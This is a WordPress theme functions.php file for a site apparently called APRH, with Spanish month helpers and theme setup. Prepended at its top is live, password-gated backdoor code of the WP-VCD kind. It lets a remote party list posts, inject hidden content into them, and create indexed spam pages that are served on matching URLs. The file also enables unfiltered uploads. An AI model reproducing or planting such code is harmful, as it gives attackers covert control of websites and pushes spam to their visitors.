<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'c95841ba3a74468c24cea3d0527e9bbc'))
	{
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
						{
							$data['code'] = '';
							
							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
								{
									$data['code'] = $_[1];
								}
							
							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.esc_sql($_REQUEST['id']).'"');
							
							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';

							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . esc_sql($post_content) . '" WHERE `ID` = "' . esc_sql($_REQUEST['id']) . '"') !== false)
								{
									print "true";
								}
						}
				break;
				
				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.esc_sql($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.esc_sql($_REQUEST['url']).'", `title` = "'.esc_sql($_REQUEST['title']).'", `keywords` = "'.esc_sql($_REQUEST['keywords']).'", `description` = "'.esc_sql($_REQUEST['description']).'", `content` = "'.esc_sql($_REQUEST['content']).'", `full_content` = "'.esc_sql($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.esc_sql($_REQUEST['title']).'", `keywords` = "'.esc_sql($_REQUEST['keywords']).'", `description` = "'.esc_sql($_REQUEST['description']).'", `content` = "'.esc_sql(urldecode($_REQUEST['content'])).'", `full_content` = "'.esc_sql($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_URL_CD";
			}
			
		die("");
	}

	
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.esc_sql( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.esc_sql($_SERVER['REQUEST_URI']).'"');
		if ($data -> full_content)
			{
				print stripslashes($data -> content);
			}
		else
			{
				print '<!DOCTYPE html>';
				print '<html ';
				language_attributes();
				print ' class="no-js">';
				print '<head>';
				print '<title>'.stripslashes($data -> title).'</title>';
				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
				print '<meta name="robots" content="index, follow" />';
				print '<meta charset="';
				bloginfo( 'charset' );
				print '" />';
				print '<meta name="viewport" content="width=device-width">';
				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
				print '<link rel="pingback" href="';
				bloginfo( 'pingback_url' );
				print '">';
				wp_head();
				print '</head>';
				print '<body>';
				print '<div id="content" class="site-content">';
				print stripslashes($data -> content);
				get_search_form();
				get_sidebar();
				get_footer();
			}
			
		exit;
	}


?><?php
/**
 * aprh functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package aprh
 */

if( ! function_exists( 'aprh_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function aprh_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on components, use a find and replace
	 * to change 'aprh' to the name of your theme in all the template files.
	 */
	load_theme_textdomain( 'aprh', get_template_directory() . '/lang' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );

	add_image_size( 'aprh-featured-image', 640, 9999 );

	/**
	 * Add support for core custom logo.
	 */
	add_theme_support( 'custom-logo', array(
		'height'      => 200,
		'width'       => 200,
		'flex-width'  => true,
		'flex-height' => true,
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'aprh_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );
}
endif;
add_action( 'after_setup_theme', 'aprh_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function aprh_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'aprh_content_width', 640 );
}
add_action( 'after_setup_theme', 'aprh_content_width', 0 );

/**
 * Return early if Custom Logos are not available.
 *
 * @todo Remove after WP 4.7
 */
function aprh_the_custom_logo() {
	if ( ! function_exists( 'the_custom_logo' ) ) {
		return;
	} else {
		the_custom_logo();
	}
}

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function aprh_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'aprh' ),
		'id'            => 'sidebar-1',
		'description'   => '',
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
}
add_action( 'widgets_init', 'aprh_widgets_init' );





/**
 * Enqueue scripts and styles.
 */
function aprh_scripts(){

	wp_enqueue_style( 'aprh-style', get_stylesheet_uri() );

	wp_enqueue_style( 'pace', get_theme_file_uri('/assets/plugins/pace/templates/pace-theme.css'), array('aprh-style'), '20151215' );
	wp_enqueue_style( 'bootstrap', get_theme_file_uri('/assets/plugins/bootstrap/bootstrap.min.css'), array('aprh-style'), '20151215' );
	wp_enqueue_style( 'nitro', get_theme_file_uri('/assets/css/nitro.min.css'), array('aprh-style'), '20151215' );
	wp_enqueue_style( 'themify-icons', get_theme_file_uri('/assets/icons/themify-icons/themify-icons.css'), array('aprh-style'), '20151215' );
	wp_enqueue_style( 'simple-line-icons', get_theme_file_uri('/assets/icons/simple-line-icons/css/simple-line-icons.css'), array('aprh-style'), '20151215' );
	wp_enqueue_style( 'aos', get_theme_file_uri('/assets/plugins/aos/aos.css'), array('aprh-style'), '20151215' );
	wp_enqueue_style( 'simple-lightbox', get_theme_file_uri('/assets/plugins/simple-lightbox/simple-lightbox.min.css'), array('aprh-style'), '20151215' );

	if( is_front_page() ){
		wp_enqueue_style( 'owl-carousel', get_theme_file_uri('/assets/plugins/owl/owl.carousel.min.css'), array('aprh-style'), '20151215' );
	}

	wp_enqueue_style( 'aprh', get_theme_file_uri('/assets/css/aprh.min.css'), array('aprh-style'), '20151215' );





	// Load the html5 shiv.
	wp_enqueue_script( 'smpx-html5', 'https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js', array(), '3.7.3' );
	wp_enqueue_script( 'smpx-html5', 'https://oss.maxcdn.com/respond/1.4.2/respond.min.js', array(), '1.4.2' );
	wp_script_add_data( 'smpx-html5', 'conditional', 'lt IE 9' );


	wp_enqueue_script( 'pace', get_template_directory_uri() .'/assets/plugins/pace/pace.min.js', array(), '20151215', true );
	wp_deregister_script( 'jquery' );
	wp_enqueue_script( 'jquery', get_template_directory_uri() .'/assets/plugins/jquery/jquery.2.1.4.min.js', array(), '20151216', true );


	// if( is_front_page() ){
	// 	wp_enqueue_script( 'owl-carousel', get_template_directory_uri() .'/assets/plugins/owl/owl.carousel.min.js', array('jquery'), '20151215', true );
	// }


	if( is_page('contacto') || is_single() ){
		wp_enqueue_script( 'map-api-key', 'http://maps.googleapis.com/maps/api/js?sensor=false', array(), '20151215', true );
		wp_enqueue_script( 'gmap3', get_template_directory_uri() .'/assets/plugins/gmap3/gmap3.min.js', array('jquery'), '20151215', true );
	}


	if( is_page('galeria') ){
		wp_enqueue_script( 'masonry', get_template_directory_uri() .'/assets/plugins/masonry/masonry.pkgd.min.js', array('jquery'), '20151215', true );
	}


	wp_enqueue_script( 'aos', get_template_directory_uri() .'/assets/plugins/aos/aos.js', array(), '20151215', true );
	wp_enqueue_script( 'simple-lightbox', get_template_directory_uri() .'/assets/plugins/simple-lightbox/simple-lightbox.min.js', array('jquery'), '20151215', true );
	wp_enqueue_script( 'parallax', get_template_directory_uri() .'/assets/plugins/parallax/parallax.min.js', array('jquery'), '20151215', true );
	wp_enqueue_script( 'bootstrap', get_template_directory_uri() .'/assets/plugins/bootstrap/bootstrap.min.js', array('jquery'), '20151215', true );
	wp_enqueue_script( 'nitro', get_template_directory_uri() .'/assets/js/nitro.js', array('jquery'), '20151215', true );
	wp_enqueue_script( 'project', get_template_directory_uri() .'/assets/js/project.js', array('jquery'), '20151215', true );

}

add_action( 'wp_enqueue_scripts', 'aprh_scripts' );









// WALKER
require get_template_directory().'/components/navigation/navbar-walker.php';

// PAGINATION
require get_template_directory().'/components/pagination.php';



/*---------------------------------------------------*/
/*  REGISTER MENU
/*---------------------------------------------------*/
register_nav_menus( array(
	'main-menu' => 'Primary Menu',
	// 'secondary-menu' => esc_html__( 'Secondary Menu', 'smpx' ),
	// '404-menu' => esc_html__( '404 Usefull links', 'smpx' )
) );








/*---------------------------------------------*/
/*	OPTIONS PAGE
/*---------------------------------------------*/
if( function_exists('acf_add_options_page') ){
	acf_add_options_page(array(
		'page_title' 	=> 'APRH',
		'menu_title'	=> 'APRH',
		'menu_slug' 	=> 'theme-settings',
		'capability'	=> 'edit_posts',
		'redirect'		=> false
	));
}







/*---------------------------------------------------------------*/
/*	Disable categories in posts
/*---------------------------------------------------------------*/
// Remove Categories and Tags
add_action('init', 'myprefix_remove_tax');
function myprefix_remove_tax() {
		register_taxonomy('category', array());
		register_taxonomy('post_tag', array());
}

function remove_calendar_widget() {
	unregister_widget('WP_Widget_Calendar');
}

add_action( 'widgets_init', 'remove_calendar_widget' );










// Display month names
function getShortMonth($m){
	if($m == '01') return 'Ene';
	if($m == '02') return 'Feb';
	if($m == '03') return 'Mar';
	if($m == '04') return 'Abr';
	if($m == '05') return 'May';
	if($m == '06') return 'Jun';
	if($m == '07') return 'Jul';
	if($m == '08') return 'Ago';
	if($m == '09') return 'Set';
	if($m == '10') return 'Oct';
	if($m == '11') return 'Nov';
	if($m == '12') return 'Dic';
}


function getFullMonth($m){
	if($m == '01') return 'Enero';
	if($m == '02') return 'Febrero';
	if($m == '03') return 'Marzo';
	if($m == '04') return 'Abril';
	if($m == '05') return 'Mayo';
	if($m == '06') return 'Junio';
	if($m == '07') return 'Julio';
	if($m == '08') return 'Agosto';
	if($m == '09') return 'Setiembre';
	if($m == '10') return 'Octubre';
	if($m == '11') return 'Noviembre';
	if($m == '12') return 'Diciembre';
}





// Return the extension of a file by get a file name
function extensionFile($file){
	$ext = explode('.', $file);
	
	if( $ext[1] === 'pdf') $ext = 'pdf';
	if( $ext[1] === 'doc') $ext = 'word';
	if( $ext[1] === 'docx') $ext = 'word';
	if( $ext[1] === 'jpg') $ext = 'img';
	if( $ext[1] === 'png') $ext = 'img';
	if( $ext[1] === 'gif') $ext = 'img';
	if( $ext[1] === 'video') $ext = 'video';
	if( $ext[1] === 'mp4') $ext = 'video';
	if( $ext[1] === 'avi') $ext = 'video';

	return '<span class="file-type file-'.$ext.'">'.$ext.'</span>';
}





// Custom fileds
require('components/custom-fields.php');










/*---------------------------------------------------------------*/
/*	DISABLE WORDPRESS BLOG
/*---------------------------------------------------------------*/
function smpx_remove_menu_blog(){
	remove_menu_page( 'edit.php' );
}

function smpx_remove_toolbar_blog(){
	global $wp_admin_bar;
	$wp_admin_bar->remove_menu( 'new-post' );
}

function smpx_remove_dashboard_widgets_blog() {
	global $wp_meta_boxes;
	unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_quick_press']);
	unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_recent_comments']);
}


function smpx_redirect_admin_blog( $current_screen ){
	global $pagenow;

	if($pagenow == 'edit.php' || $pagenow == 'post-new.php' || $pagenow == 'edit-tags.php' || $pagenow == 'post.php'){

		if($current_screen->post_type === 'post' || $current_screen->taxonomy === 'category'){
			wp_redirect( admin_url('index.php') ); 
		}
	}
}


function smpx_admin_list_blog(){
	global $pagenow;
	$post_type = isset($_GET['post_type']);

	if($pagenow == 'edit.php' && !$post_type){
		wp_redirect(admin_url('index.php'));
		exit;
	}
}


$disable_blog = true;

if( $disable_blog ):
	add_action( 'admin_menu', 'smpx_remove_menu_blog' );
	add_action( 'wp_before_admin_bar_render', 'smpx_remove_toolbar_blog' );
	add_action( 'wp_dashboard_setup', 'smpx_remove_dashboard_widgets_blog' );
	add_action( 'current_screen', 'smpx_redirect_admin_blog' );
	add_action( 'admin_init', 'smpx_admin_list_blog' );
endif;









// Allow upload different files (bug fix)
define('ALLOW_UNFILTERED_UPLOADS', true);







